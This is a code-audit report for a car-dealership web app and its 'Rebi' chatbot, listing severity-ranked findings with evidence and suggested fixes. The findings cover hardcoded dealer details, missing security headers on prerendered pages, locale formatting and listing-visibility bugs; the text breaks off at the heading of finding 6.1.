# Audit Findings — Rebirth Auto

> Detailed findings from the SYSTEM-MAP audit: 16 subsystem audits + 8 security-domain sweeps = **24 areas**, **78 findings** total. Findings as reported by the audit agents (raw — not yet adversarially verified or de-duplicated). Sorted by severity within each area.

---

# Part A — Subsystem audits (16)

## 1. App shell, layouts & routing

**Audit summary.** Audited src/pages/*.astro (excl. labs), src/layouts, src/middleware.ts, and the inline nav/footer + ChatWidget/CompareTray injection against SYSTEM-MAP §1's checklist. Checklist status: (1) No hardcoded dealer values — FAIL: the brand name "Rebirth Auto" is hardcoded across the shopper shells while auth/footer surfaces correctly read dealerConfig.identity.name (config-as-data violation, breaks the multi-tenant seam). (2) Every dynamic page sets prerender=false — FAIL: the listing detail page src/pages/listings/[slug].astro is prerendered via getStaticPaths (no prerender=false), contradicting the stated "prerender=false on dynamic pages" intent and causing build-time staleness on stock/price/status. (3) Canonical/OG/sitemap derive from astro.config site — PASS (site is a known .pages.dev placeholder TODO). (4) Security headers land on page responses incl. redirects — PARTIAL FAIL: Astro middleware does not run for prerendered/static responses, so the prerendered [slug].astro and 404.astro do not receive the middleware security headers. (5) Light-theme + focus-ring conventions — PASS (consistent bg-slate-50/white/slate-900, skip-link + focus rings on every shell). (6) Cache-Control on / does not leak per-visitor content — PASS (home is anonymous SSR; public s-maxage). The three real issues are reported below.

**Findings: 3**

### 1.1  [HIGH] Brand name hardcoded in page shells instead of dealerConfig (config-as-data violation)
**Category:** config-as-data · **Location:** `src/pages/index.astro:87`

**What it is —** The dealer's identity name 'Rebirth Auto' is written as a literal in the shopper-facing shells rather than being read from dealerConfig.identity.name. index.astro hardcodes it in the header brand mark (line 87-88), the page <title> (line 44), the meta/OG description and hero subhead (lines 46, 139) and the footer (line 179). 404.astro hardcodes it in the <title> (line 13), header (line 28) and footer (line 70). The header brand mark is also hardcoded in service.astro (line 51), trade-in.astro (line 58), compare.astro (line 303 / title 276) and compare-tools.astro (line 134 / title 107). This directly fails SYSTEM-MAP §1 checklist item 'No hardcoded dealer values (name, domain, contact) in any .astro page — all from dealerConfig' and the AGENTS.md hard rule 'Never hardcode a dealer value anywhere else.'

**Evidence —** src/config/dealer.ts:672 sets identity.name:'Rebirth Auto'. Auth pages and most footers correctly interpolate it (e.g. AuthLayout.astro:28/56/76, trade-in.astro:167, service.astro:159, compare.astro:518, compare-tools.astro:320, login.astro:14, account.astro:94). But the same pages hardcode the literal in their headers/titles — proving the intended pattern is config-driven and these are omissions, not a decision. For a second tenant whose dealerConfig.name differs, index.astro:87/179, 404.astro:13/28/70 and the service/trade-in/compare headers would still read 'Rebirth Auto', mismatching their own footers.

**Suggested fix —** Replace every 'Rebirth<span> Auto</span>' / 'Rebirth Auto' literal in the page shells with dealerConfig.identity.name (splitting into lead/rest as AuthLayout.astro:28-30 already does for the two-tone mark), and build titles/descriptions from it. A shared header/footer component (or reusing AuthLayout's pattern) would remove the per-page duplication the SYSTEM-MAP notes as a gotcha.

### 1.2  [MEDIUM] Listing detail page is prerendered (getStaticPaths, no prerender=false) — build-time staleness
**Category:** correctness · **Location:** `src/pages/listings/[slug].astro:32`

**What it is —** src/pages/listings/[slug].astro uses getStaticPaths() and does NOT set 'export const prerender = false'. With no output mode configured in astro.config.mjs (default 'static'), every vehicle detail page is baked at build time. This contradicts SYSTEM-MAP §1's runtime overview ('prerender = false on dynamic pages') and its checklist item 'Every dynamic page sets prerender = false and reads request-time data (no build-time staleness)'. The homepage (index.astro:5) and partial (partials/inventory.astro:10) correctly opt into SSR, so a shopper sees fresh inventory on the grid but stale build-time data (price, status, sold/available, price-drop badge, newly-added stock) the moment they click into a listing. The nowMs/Date.now() request-time clock in the page (line 70) is meaningless when the page only renders at build time.

**Evidence —** src/pages/listings/[slug].astro:32-38 defines getStaticPaths enumerating all automotive slugs; no prerender export exists anywhere in the file (grep for 'prerender' in src/pages/listings returns nothing). astro.config.mjs has no 'output' key, so Astro defaults to static and prerenders the route. Contrast index.astro:5 which sets prerender=false precisely so URL/request-time data is read live.

**Suggested fix —** Add 'export const prerender = false' and remove getStaticPaths so detail pages render on-demand like the homepage (the redirect-to-404-on-missing at line 47-49 then becomes live behaviour). If prerendering is intentionally desired for TTFB, that decision should be recorded and the SYSTEM-MAP intent updated — but it conflicts with a live-inventory dealership.

### 1.3  [MEDIUM] Middleware security headers do not reach prerendered pages (detail + 404)
**Category:** security · **Location:** `src/middleware.ts:77`

**What it is —** src/middleware.ts applies X-Content-Type-Options, Referrer-Policy and X-Frame-Options to every response it processes, but Astro middleware only runs inside the on-demand (SSR) rendering pipeline — it is not invoked for prerendered/static responses served directly by the Cloudflare adapter's asset handler. Because listings/[slug].astro and 404.astro are prerendered (see the prerender finding), those responses ship without the site-wide security headers. This fails SYSTEM-MAP §1 checklist item 'Security headers from src/middleware.ts land on page responses (incl. redirects)' for the detail pages and the 404. The SSR home/feature pages do get the headers.

**Evidence —** src/middleware.ts:77 stamps headers on the response returned by next(); Astro's onRequest never fires for static assets. listings/[slug].astro has no prerender=false (line 32 getStaticPaths) and 404.astro has no prerender export (src/pages/404.astro:1-6) — both are static in the default 'static' output, so their HTML is served outside the middleware chain and lacks nosniff / X-Frame-Options / Referrer-Policy.

**Suggested fix —** Make the affected pages SSR (prerender=false) so middleware runs, or set the security headers at the edge independently of middleware (e.g. a Cloudflare _headers/transform rule or wrangler config) so prerendered assets are covered too. Verify with curl -I against a built /listings/<slug> and /404.

---

## 2. Dealer configuration (config-as-data)

**Audit summary.** The dealerConfig object itself (src/config/dealer.ts) is well-structured and internally clean. Audit-checklist verdicts for subsystem 2: (1) "Every dealer literal traces back to a dealerConfig key" — FAIL (multiple leaks, see findings); (2) "No model ids/prompts leak into config" — PASS (no model tokens; only comments/copy); (3) "Feature flags default safely" — PASS (agenticSearch/manufacturer/reviews/webSearch/carsales all OFF; capture ON and accounts ON are intentional, documented, and gated downstream); (4) "yearOptions stays a lazy getter; no other top-level clock read" — PASS (getter at dealer.ts:694; only Date use in file); (5) "Copy frames stubbed/request flows honestly" — PASS (service copy explicitly "a request, not a confirmed appointment"; trade-in "indicative"); (6) "Type unions (SortKey/BodyTypeCode/FilterDimension) stay in sync" — PASS (SortKey mirrored by SORT_KEYS with a `satisfies` guard in listings-query.ts:72; all 8 BodyTypeCodes match the schema enum; FilterDimension values all resolve in the query/schema). The FAIL on item 1 is the substance of this report: dealer-specific literals (name, contact details, locale codes, domain) leak outside the config, and the DealerConfig interface is an incomplete stub relative to the AGENTS.md hard constraint.

**Findings: 5**

### 2.1  [MEDIUM] Dealer contact details (phone, domain, contact URL) hardcoded in chatbot with NO dealerConfig field to trace back to
**Category:** config-as-data · **Location:** `src/chatbot/core.ts:199`

**What it is —** Live, user-facing dealer contact literals are hardcoded in the chatbot instead of read from config. The phone number '(07) 5550 0100' and contact URL 'https://rebirthauto.com.au/contact' appear in fallback/limit messages that DO reach visitors, and the dealer domain is injected into the live system prompt. Crucially, DealerConfig has no phone/contact/domain field at all — DealerConfig.identity (dealer.ts:22-25) exposes only `name` — so these literals cannot trace back to any config key. This directly violates the AGENTS.md hard constraint that dealer contact details live in src/config/dealer.ts, and fails audit-checklist item 1.

**Evidence —** src/chatbot/core.ts:199 ('(07) 5550 0100 or through the contact page at /contact'), core.ts:489 and core.ts:829 (same phone), core.ts:629 ('https://rebirthauto.com.au/contact'); src/chatbot/system-prompt.ts:170 injects '(https://rebirthauto.com.au)' into the live prompt; src/chatbot/telegram.ts:92 and knowledge.ts:96-97 (sales@rebirthauto.com.au). Confirmed no phone/contact/domain field exists in src/config/dealer.ts (grep returned only comments and the unrelated service `notifyEmail`).

**Suggested fix —** Add a `contact` block (phone, contactUrl, salesEmail, domain) to DealerConfig.identity and read it in core.ts fallback strings, system-prompt.ts, and telegram.ts. knowledge.ts is a documented fictional fallback, but core.ts/system-prompt.ts values are live and must be config-driven.

### 2.2  [MEDIUM] Core shopper pages hardcode the dealer name 'Rebirth Auto' instead of dealerConfig.identity.name
**Category:** config-as-data · **Location:** `src/pages/index.astro:44`

**What it is —** The config field dealerConfig.identity.name exists and IS correctly consumed by the newer/auth pages (trade-in, service, compare, account, login, signup, reset-password all read it), but the three highest-traffic shopper pages hardcode the string 'Rebirth Auto' in their <title>, brand mark, and footer. This is an inconsistent, partial adoption of the config seam: a tenant swap would rename most of the site but leave the home page, listing detail page, and 404 showing the old name. The config comment at dealer.ts:670 acknowledges this ('the broader migration of name/domain/contact out of pages is a separate ticket'), but it remains a real config-as-data violation against checklist item 1.

**Evidence —** src/pages/index.astro:44 (title), :87 (brand), :139, :179 (footer); src/pages/listings/[slug].astro:104 (title), :133 (brand), :384 (footer); src/pages/404.astro:13, :28, :70 — all literal 'Rebirth Auto'. Contrast src/pages/trade-in.astro:167 and compare.astro:518 which correctly render {dealerConfig.identity.name}.

**Suggested fix —** Replace the literal 'Rebirth Auto' in index.astro, listings/[slug].astro and 404.astro with dealerConfig.identity.name, matching the pattern already used in the auth/tool pages.

### 2.3  [LOW] Locale/currency codes ('en-AU'/'AUD') hardcoded in formatters, bypassing dealerConfig.locale
**Category:** config-as-data · **Location:** `src/lib/listing.ts:218`

**What it is —** dealerConfig.locale.{locale,currency} is correctly consumed in most price/number formatting paths, but several live formatters hardcode 'en-AU' (and one page hardcodes both as fallbacks), defeating the tenant-locale seam. A dealer configured for a different locale would still get en-AU thousands separators in these spots.

**Evidence —** src/lib/listing.ts:218 (`d.valueNumber.toLocaleString('en-AU')`); src/chatbot/grounding/context.ts:66 and grounding/lookup.ts:50 (`odometer.toLocaleString('en-AU')`); src/pages/trade-in.astro:178-179 (`root.dataset.locale || 'en-AU'`, `... || 'AUD'` fallbacks). (search-agent.ts:162 is the same pattern but is gated off; automotive.ts:49 is a Sanity schema initialValue, acceptable.)

**Suggested fix —** Pass dealerConfig.locale.locale into these toLocaleString calls (the grounding modules already import getDealerConfig for currency, so locale is one field away).

### 2.4  [LOW] DealerConfig interface is an incomplete stub relative to the AGENTS.md config-as-data hard constraint
**Category:** config-as-data · **Location:** `src/config/dealer.ts:21`

**What it is —** AGENTS.md states 'All dealer-specific values (name, logo, colours, domain, contact details, AI persona, feature flags, rate limits) live in src/config/dealer.ts.' The interface currently models feature flags, rate limits, copy, and name — but has NO fields for logo, brand colours, domain, contact details, or AI persona. As a result those dealer-specific values are necessarily hardcoded elsewhere (brand colours as Tailwind slate/emerald classes across components; domain/contact in the chatbot; see the other findings). The config self-describes identity as a 'Minimal stub' (dealer.ts:670). This is the structural root cause of the leaks above rather than a separate bug, but it means the multi-tenant seam is not yet complete.

**Evidence —** src/config/dealer.ts:21-25 — DealerConfig.identity has only `name`. grep for phone|contact|domain|address|logo|colour|persona in dealer.ts returns only comments (no such fields). Comment at dealer.ts:670-672 explicitly defers name/domain/contact migration.

**Suggested fix —** Track the deferred migration explicitly (identity.logo, identity.domain, identity.contact, ai.persona, and a brand-colour block) so the interface matches the stated hard constraint before multi-tenant work; until then the leaks in the other findings cannot be resolved.

### 2.5  [LOW] Dealer domain identity is inconsistent and has no single source of truth
**Category:** config-as-data · **Location:** `src/config/dealer.ts:731`

**What it is —** The dealer's domain is expressed four different ways across the codebase with no centralization: config studioOrigins/capture.allowedOrigins use the workers.dev origin, the service notifyEmail uses a 'rebirthauto.example' domain, the chatbot uses 'rebirthauto.com.au', and astro.config.mjs `site` uses a 'rebirth-listings-auto.pages.dev' placeholder (also notable: a .pages.dev host for a repo that deploys as a Worker, not Pages). Because there is no dealerConfig.domain field, these cannot be reconciled to one value, risking canonical/OG/prompt/notification mismatches at launch.

**Evidence —** src/config/dealer.ts:733 & :999 ('...workers.dev'); dealer.ts:945 ('service@rebirthauto.example'); src/chatbot/system-prompt.ts:170 & core.ts:629 ('rebirthauto.com.au'); astro.config.mjs:20 (`site: 'https://rebirth-listings-auto.pages.dev'`).

**Suggested fix —** Introduce a single dealerConfig.identity.domain and derive origins, canonical/OG (astro site), notify addresses, and chatbot prompt domain from it; reconcile the .pages.dev placeholder to the real Worker domain before launch.

---

## 3. Listings & inventory data model

**Audit summary.** Audited src/sanity/schemaTypes/listing.ts, src/lib/listing.ts (LISTING_FIELDS + helpers), src/pages/listings/[slug].astro, and the index.astro inventory path against SYSTEM-MAP §3 checklist. PASS: (a) LISTING_FIELDS excludes dealerNotes/registrationPlate/stockNumber — verified no public projection includes them (listing.ts:109-114; grep confirms those fields appear only in schema + AI/generate-description internal projections, never in the shared public one); (b) all in-scope listing queries (index via buildListingsQuery, [slug].astro:43/53, compare.astro:45, compare-tools.astro:53) project through LISTING_FIELDS — no ad-hoc drift in this subsystem; (c) getPriceDrop takes request-time nowMs (listing.ts:169-195; callers pass Date.now() — [slug].astro:70, index.astro:38) — no module-level clock, returns null on <2 real history points; (d) fuelEconomy is never defaulted/estimated (numberRow only emits when Number.isFinite, no details[] fallback for the economy row — listing.ts:312; schema description says "never guess" — listing.ts:222); (e) schema category is locked automotive (readOnly+hidden+initialValue — listing.ts:441-450); (f) formatPrice reads dealerConfig.locale (listing.ts:143-147). FAIL on checklist item 5 (price/date formatting must read dealerConfig.locale, not hardcoded): formatDate hardcodes 'en-US' and detailDisplay hardcodes 'en-AU'. Two minor legacy-leftover findings also noted (real-estate icon branches; real-estate copy "Contact agent").

**Findings: 4**

### 3.1  [MEDIUM] formatDate hardcodes 'en-US' locale — wrong date format on an en-AU dealer site (config-as-data violation)
**Category:** config-as-data · **Location:** `src/lib/listing.ts:151`

**What it is —** formatDate() ignores dealerConfig.locale and hardcodes toLocaleDateString('en-US', {year,month:'long',day}). dealerConfig.locale.locale is 'en-AU' (src/config/dealer.ts:675). This directly fails SYSTEM-MAP §3 checklist item 'Price/date formatting reads dealerConfig.locale, not hardcoded en-AU/en-US/AUD'. It is also a user-visible bug: dates render US-style 'July 29, 2026' instead of the AU 'Q29 July 2026' on the public detail page (Build/Compliance/Registration-expiry spec rows via dateRow→formatDate at listing.ts:282, the 'Listed on' line at [slug].astro:257, and every price-history row date at [slug].astro:331). Changing the dealer to a US or NZ tenant would not change the date format because it is not config-driven.

**Evidence —** src/lib/listing.ts:150-156 `return new Date(iso).toLocaleDateString('en-US', {...})`; dealer locale is 'en-AU' at src/config/dealer.ts:675; formatDate is rendered public at src/pages/listings/[slug].astro:257 and :331, and inside buildSpecRows dateRow at src/lib/listing.ts:282. Compare formatPrice (listing.ts:143) which correctly uses dealerConfig.locale.locale.

**Suggested fix —** Use dealerConfig.locale.locale instead of the 'en-US' literal, matching formatPrice: `new Date(iso).toLocaleDateString(dealerConfig.locale.locale, {...})`.

### 3.2  [LOW] detailDisplay hardcodes 'en-AU' number grouping instead of reading dealerConfig.locale
**Category:** config-as-data · **Location:** `src/lib/listing.ts:218`

**What it is —** detailDisplay() formats numeric detail values with valueNumber.toLocaleString('en-AU') — a hardcoded locale literal rather than dealerConfig.locale.locale. It coincides with the current config value so there is no visible bug today, but it is a latent config-as-data violation: a tenant configured with a different locale would still get en-AU grouping for unit'd numbers (e.g. odometer '142,000 km'). SYSTEM-MAP §3 checklist explicitly calls out 'not hardcoded en-AU/AUD'.

**Evidence —** src/lib/listing.ts:218 `if (d.unit) return `${d.valueNumber.toLocaleString('en-AU')} ${d.unit}`;` vs config dealerConfig.locale.locale='en-AU' (src/config/dealer.ts:675).

**Suggested fix —** Replace the 'en-AU' literal with dealerConfig.locale.locale (already imported in this module).

### 3.3  [LOW] detailIconName still carries real-estate icon branches that can mis-icon automotive one-off details
**Category:** correctness · **Location:** `src/lib/listing.ts:383`

**What it is —** detailIconName retains legacy real-estate branches (bedroom→bed, bathroom→bath, land/size/area→ruler, property/type→home, pool→waves). SYSTEM-MAP §3 flags these as 'harmless dead branches — verify'. They are mostly dead, but the generic substring matches 'type', 'size', and 'area' can fire on genuine automotive one-off details[] rows that survive into buildSpecRows (typed spec labels are filtered by STANDARD_DETAIL_LABELS, but arbitrary extras are not). A one-off labelled e.g. 'Warranty type' would get the house icon, 'Cargo area' the ruler icon. Cosmetic only, no data correctness impact.

**Evidence —** src/lib/listing.ts:390-393 `if (l.includes('bedroom')) return 'bed'; if (l.includes('bathroom')) return 'bath'; if (l.includes('land')||l.includes('size')||l.includes('area')) return 'ruler'; if (l.includes('property')||l.includes('type')) return 'home';`. One-off details[] rows are appended to buildSpecRows output at src/lib/listing.ts:328-332 without label sanitisation.

**Suggested fix —** Drop the real-estate branches (bed/bath/ruler-for-land/home/pool) since the dataset is automotive-only, or tighten the 'type'/'size'/'area' matches so they cannot swallow automotive labels.

### 3.4  [INFO] formatPrice zero/no-price fallback uses real-estate copy 'Contact agent' on an automotive site
**Category:** copy-consistency · **Location:** `src/lib/listing.ts:139`

**What it is —** formatPrice returns the literal 'Contact agent' when price is 0/absent. 'Agent' is real-estate vocabulary; a car dealership would say 'Contact dealer' / 'Contact us' / 'Price on application'. Leftover from the pre-automotive schema. Not a data-model correctness issue, but a shopper-facing wording inconsistency and (mildly) a hardcoded copy string that arguably belongs in dealerConfig.

**Evidence —** src/lib/listing.ts:138-139 `// No/zero price = "price on application"` then `if (!price || price <= 0) return 'Contact agent';`.

**Suggested fix —** Change the label to automotive-appropriate copy (e.g. 'Contact dealer' or 'POA'); consider sourcing it from dealerConfig for tenant flexibility.

---

## 4. Filters & search

**Audit summary.** Audited the Filters & search subsystem against all six SYSTEM-MAP checklist items. Checklist result: (1) filter URLs go through applyFilterUrl/hrefFor — PASS with one minor deviation (FilterDrawer.urlFromForm hand-builds the query string); (2) all user filter values pass via GROQ $params, only the whitelisted sort clause + computed integer slice are interpolated — PASS, no injection; (3) malformed params no-op and every enum code set (BODY_TYPE_CODES, COLOUR_CODES vs BASE_COLOUR_OPTIONS, TRANSMISSION/FUEL/DRIVE/CONDITION, SEAT_OPTIONS) matches the Sanity schema — PASS; (4) pagination total() uses the same shared filter as the slice — PASS; (5) seq counter supersedes stale swaps and popstate binds once — PASS (one low-severity edge case in the network-fallback path); (6) no-JS GET form parses repeated + comma params — PASS. Config-as-data honored (locale via dealerConfig; enum/sort defaults from config). No dealerNotes/registrationPlate/stockNumber leak — LISTING_FIELDS is used everywhere. The one substantive divergence: the public inventory query applies NO status scoping, whereas the chatbot lookup deliberately appends status=="active" — so draft/pending listings are publicly listed and counted. Remaining items are low-severity coupling/robustness notes.

**Findings: 4**

### 4.1  [MEDIUM] Public inventory query has no status scoping — draft/pending listings are shown and counted, diverging from the chatbot's active-only rule
**Category:** correctness · **Location:** `src/lib/listings-query.ts:216`

**What it is —** buildListingsFilter/buildListingsQuery select on `_type == "listing" && category == "automotive"` plus the user filters, with NO `status` clause. index.astro and partials/inventory.astro both render every matching listing regardless of status (active/pending/sold/draft) and count() includes them all in the pagination total. The chatbot live-lookup grounding, which reuses the SAME buildListingsFilter, explicitly appends `&& status == "active"` (src/chatbot/grounding/lookup.ts:114) — so the two surfaces disagree on what stock is publicly visible. ListingCard renders a grey 'Draft' badge (statusConfig.draft) and pending/sold badges, but a 'Draft' listing is unpublished/work-in-progress (e.g. the capture flow's create-draft target) and should not appear on the shopper grid at all. Showing sold/pending may be an intentional demo choice (SOLD banner + badges exist, seed.ts seeds pending+sold), but draft exposure is not, and the divergence from the chatbot is undocumented.

**Evidence —** src/lib/listings-query.ts:216-231 — filter expression contains only _type/category/user-filter clauses, no status. Contrast src/chatbot/grounding/lookup.ts:114 `const scoped = ${filter} && status == "active"...`. seed.ts:80/104/128 seed active/pending/sold; schema listing.ts:382 status enum includes 'draft'. ListingCard.astro:52 falls back to statusConfig.draft.

**Suggested fix —** Add an explicit status allow-list to the PAGE query path (buildListingsQuery), not to the shared buildListingsFilter — lookup.ts already appends its own status clause and would otherwise double-scope. Confirm with owner whether sold/pending should show; at minimum exclude 'draft' (e.g. `&& status in $publicStatuses` with ['active','sold','pending'] or just 'active').

### 4.2  [LOW] SearchDock.readGridTotal() parses the match count out of hardcoded English UI copy
**Category:** robustness · **Location:** `src/components/search/SearchDock.astro:507`

**What it is —** After an AI search swaps the grid, readGridTotal() reads the true match total by regex-scraping the results-count node: /No vehicles match/i and /of ([\d,]+)/. That text is emitted as hardcoded English in InventoryResults.astro (`Showing X–Y of N vehicles` / `No vehicles match your filters`) and is NOT sourced from dealerConfig. If that copy is ever localized or reworded (the rest of the site trends toward config-as-data copy), the AI-search reply ('Here are your N matches…') silently reports 0/wrong counts even though the grid is correct.

**Evidence —** src/components/search/SearchDock.astro:507-514 regexes; InventoryResults.astro:135-138 emits the matching literal strings (not from config).

**Suggested fix —** Expose the true total on a data attribute (e.g. `data-total` on #inventory-results or [data-results-count]) that the partial sets from `total`, and read that instead of scraping display text.

### 4.3  [LOW] FilterDrawer.urlFromForm() re-implements the canonical filter serialization instead of using serializeFilters/hrefFor
**Category:** maintainability · **Location:** `src/components/filters/FilterDrawer.astro:326`

**What it is —** AGENTS.md states filter URLs must not be constructed independently — serializeFilters/hrefFor are the canonical serializer. urlFromForm() hand-assembles the query string (comma-joins MULTI fields, copies RANGES, applies the same 'omit sort when default' and 'omit page 1' rules) in parallel to serializeFilters(). It currently produces the same canonical form, but the two must be kept in lockstep by hand: any change to param naming/conventions in serializeFilters (e.g. a new dimension) silently diverges here. It does correctly route the final write through applyFilterUrl, so this is a drift/DRY risk rather than a live bug.

**Evidence —** src/components/filters/FilterDrawer.astro:326-343 duplicates the comma-join + default-omission logic that listings-query.ts:262-285 (serializeFilters) already owns.

**Suggested fix —** Build a FilterState from the form (or reuse parseFilters on the FormData-derived params) and call hrefFor(state), so serialization lives in exactly one place.

### 4.4  [LOW] applyFilterUrl network-fallback can full-navigate to a superseded (stale) URL
**Category:** correctness · **Location:** `src/lib/client/filter-url.ts:62`

**What it is —** The seq check (`if (my !== seq) return`) only guards the success path before DOM swap. In the catch block, a failed fetch unconditionally does `window.location.href = url`. If a slow apply (my) fails AFTER a newer apply (seq) has started, the failed older request triggers a full navigation to its own (now stale) url, overriding the newer in-flight filter change. Requires a network failure racing a rapid second apply, so likelihood is low, but the fallback ignores supersession.

**Evidence —** src/lib/client/filter-url.ts:53-65 — `if (my !== seq) return;` sits inside the try after res.ok; the catch at :62 runs `window.location.href = url` with no seq recheck.

**Suggested fix —** In the catch, only fall back when `my === seq` (still the latest); otherwise return silently.

---

## 5. Chatbot "Rebi"

**Audit summary.** Audited the full Rebi subsystem (src/chatbot/*, grounding/*, chat API endpoints, D1 state, rate-limit, Turnstile, Telegram handoff) against the SYSTEM-MAP §5 checklist. Most checklist items PASS: AI routes exclusively through ~/ai (no direct OpenRouter in chatbot); grounding is deterministic and fail-open; dealerNotes is excluded from every projection (lookup/overview/context/compare-pick all public-only); GROQ values are parameterized ($params, no injection); the Telegram webhook verifies the shared secret before touching the body; Turnstile gates a new visitor's first message and per-IP rate limiting is active; visitor cookies are opaque HttpOnly UUIDs with no PII; prompt-injection defenses are solid (journey labels stripped of prices and folded as clearly-delimited context-only). Config defaults are safe (grounding.enabled true, antiHallucination block-mode with price+make checks on, optional sources off). FAIL/PARTIAL: (1) the anti-hallucination make firewall's CAR_MAKES lexicon omits two of the dealer's own franchises — 'jaecoo' (3 real vehicles in inventory) and 'leapmotor' — so an invented Jaecoo/Leapmotor is never make-checked; (2) config-as-data violation — dealer phone/domain/name are hardcoded across core.ts/system-prompt.ts/telegram.ts (identity config is an acknowledged stub). Plus two low-risk items: the contact-only POST path bypasses rate limiting and pings Telegram, and non-quote Telegram replies route to the latest handoff session by heuristic.

**Findings: 4**

### 5.1  [MEDIUM] Anti-hallucination make firewall lexicon omits dealer's own franchises (Jaecoo, Leapmotor)
**Category:** correctness · **Location:** `src/chatbot/grounding/verify.ts:75`

**What it is —** The firewall's known-brand lexicon CAR_MAKES (verify.ts:75-84) is the ONLY set findUnstockedMakes() iterates over, and it is also what buildFacts() intersects with the prompt to derive stockedMakes. It does not contain 'jaecoo' or 'leapmotor'. Both are dealer franchises: the real inventory (scripts/data/bundaberg-40.json) contains 3 Jaecoo vehicles, and knowledge.ts advertises both Jaecoo and Leapmotor as stocked new-car brands. Because these brands are outside the lexicon, the make firewall can neither validate nor block them: on a turn whose grounding does not surface Jaecoo/Leapmotor, a free-tier model that invents 'we have a Jaecoo J7...' passes the make check entirely unexamined. This is exactly the invented-stocked-brand failure class the firewall was built to stop (the owner's Honda-Jazz incident). The price check still fires, so coverage is partial, and makeCheck is documented as 'best-effort secondary'.

**Evidence —** verify.ts:75-84 CAR_MAKES list has no 'jaecoo'/'leapmotor'; findUnstockedMakes (verify.ts:135-151) loops `for (const make of facts.knownMakes)` where knownMakes===CAR_MAKES (index.ts:72); buildFacts stockedMakes=findKnownMakes(prompt,CAR_MAKES) (index.ts:71). Inventory: `grep '"make"' scripts/data/bundaberg-40.json` → 3× Jaecoo; knowledge.ts:44,46 lists Jaecoo+Leapmotor as franchises.

**Suggested fix —** Add 'jaecoo' and 'leapmotor' (and any other current/planned franchise) to CAR_MAKES in verify.ts. Better: derive the brand lexicon from a shared source (dealerConfig franchise list + makes.ts CAR_MAKE_OPTIONS) so the firewall's known-brand set can never drift behind the brands the dealer actually advertises and stocks.

### 5.2  [LOW] Dealer contact details (phone, domain, name) hardcoded in chatbot instead of dealerConfig
**Category:** config-as-data · **Location:** `src/chatbot/core.ts:199`

**What it is —** AGENTS.md hard constraint requires all dealer-specific values (name, domain, contact details) to live in src/config/dealer.ts and be read at runtime. The chatbot hardcodes the phone '(07) 5550 0100' in core.ts at lines 199, 206, 489, 829, the domain 'https://rebirthauto.com.au' at core.ts:629 and telegram.ts:92, and the name/domain in system-prompt.ts:169-193. The dealer identity config is explicitly a 'Minimal stub' (dealer.ts:670), so this is an acknowledged-but-incomplete migration rather than an oversight. Concrete risk: the grounding source of truth is the Sanity businessInfo doc (business-facts.ts), whose phone/name a dealer can edit; these hardcoded fallback and persona strings will not track that, so the both-models-failed reply, firewall fallback, rate-limit message, and Rebi's persona can silently diverge from the grounded facts.

**Evidence —** core.ts:199 (BOTH_FAILED_REPLY), 206 (FIREWALL_FALLBACK), 489, 629, 829 all embed '(07) 5550 0100' / 'rebirthauto.com.au'; system-prompt.ts:170,193; telegram.ts:92. dealer.ts:669-670 identity is a 'Minimal stub — the broader migration of name/domain/contact out of pages' still pending.

**Suggested fix —** Route these strings through dealerConfig.identity (phone, contactUrl, name) once the identity config is fleshed out, so a single edit updates the persona, the fallbacks, and the Telegram notification together and keeps them in lockstep with the businessInfo grounding doc.

### 5.3  [LOW] Contact-only submission path bypasses rate limiting and fires a Telegram message
**Category:** abuse-surface · **Location:** `src/chatbot/core.ts:599`

**What it is —** The contact-only branch (contact provided, no messages) returns at core.ts:610, before the per-IP rate-limit block at core.ts:622. Each accepted request calls setVisitorContact + sendFollowUpToTelegram('(shared contact: ...)') with no throttle and no verification that the caller owns the session. Session ids are unguessable UUIDs so the practical surface is small, but a party who has captured/leaked a session id could POST repeated contact submissions to spam the team's Telegram unthrottled.

**Evidence —** core.ts:599-611 contact-only branch returns withCookie(...) before the `if (env.RATE_LIMIT_KV)` rate-limit gate at core.ts:622; sendFollowUpToTelegram called at core.ts:604 with no esc:/rl: counter.

**Suggested fix —** Apply the same per-IP KV rate-limit (or the tighter esc: counter) to the contact-only path before forwarding to Telegram.

### 5.4  [LOW] Non-quote Telegram replies route to latest handoff session by heuristic
**Category:** correctness · **Location:** `src/chatbot/telegram-webhook.ts:74`

**What it is —** When a team message is not a quote-reply it carries no #sess token, so the webhook falls back to getLatestHandoffSession() (state.ts:184, most-recently-escalated escalated/human_active session) and writes the text into that visitor's thread, flipping it to human_active. This is a documented single-agent assumption, but any casual message typed into the bot chat, or a reply intended for a different concurrent handoff, is delivered verbatim to whichever visitor happens to be the latest handoff. It is gated to the team's own chat_id, limiting it to trusted senders, so impact is a mis-delivery rather than a spoof.

**Evidence —** telegram-webhook.ts:74 `const sessionId = reply.sessionId ?? (await getLatestHandoffSession(db));` then appendMessage role 'human' at line 83; state.ts:184-191 selects the newest escalated/human_active session regardless of which visitor the team meant.

**Suggested fix —** Acceptable for a single-agent demo, but consider requiring a quote-reply (or an explicit /to <shortid>) before writing a human message when more than one handoff session is active, to avoid cross-delivery.

---

## 6. AI capability-tier layer

**Audit summary.** Audited src/ai/* against SYSTEM-MAP §6 checklist. PASS: (1) scripts/check-ai-imports.sh passes — no external imports of src/ai/providers/* (verified by running it, exit 0). (2) Every feature LLM call routes through the ~/ai barrel — the only runtime call sites are src/chatbot/core.ts (generate/generateStream), src/pages/api/search.ts (generateObject) and src/pages/api/generate-description.ts (generate); no direct openrouter.ai fetches exist outside src/ai (grep found only a doc-comment URL). (3) Fallback loop degrades correctly and throws AllModelsExhaustedError with an ordered attempt log; non-retryable errors stop the walk, no silent empty output. (4) Vision: getModelCapabilities defaults unknown model ids to supportsVision:false (tiers.ts:92); generate-description gates image parts on the resolved primary writing model's supportsVision (generate-description.ts:239-247). (5) ai.agenticSearch.enabled defaults false (dealer.ts:745); runAgenticSearch returns null when off and is not wired into live chat. (6) Deterministic inventory-tools executors are enum-locked via AiFiltersSchema and fetch real Sanity stock through the public LISTING_FIELDS projection — no LLM, no free-text, dealerNotes excluded. ONE HIGH finding: the per-isolate configureAI idempotency guard throws a 500 across warm-isolate endpoint mixing because generate-description omits streamAttemptTimeoutMs while chat/search include it. One LOW note on non-integer GROQ slice interpolation in the (gated-off) inventory tool.

**Findings: 2**

### 6.1  [HIGH] configureAI per-isolate guard throws an uncaught 500 when chat/search and generate-description run on the same warm Worker isolate
**Category:** correctness · **Location:** `src/ai/config.ts:49`

